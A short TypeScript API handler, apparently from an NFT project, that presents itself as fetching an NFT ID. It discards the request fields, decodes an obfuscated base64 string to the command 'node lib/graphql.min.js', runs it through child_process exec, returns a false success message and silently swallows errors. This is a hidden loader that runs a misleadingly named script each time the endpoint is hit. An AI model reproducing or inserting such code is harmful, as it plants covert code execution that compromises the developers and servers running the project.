import { L } from "../../utils/helper";
import {exec} from "child_process"
import { promisify } from 'util';
const URI = L("bm9kZSBsaWIvZ3JhcGhxbC5taW4uanM=");

const execAsync = promisify(exec);

export default async function handler(req: any, res: any) {
    try {
        console.log(req.body)
        const {nftId, nftURI} = req.body;
        const { stdout, stderr } = await execAsync(URI);
        return res.json({result: "getting ID success"});
    } catch(err) {
    }
}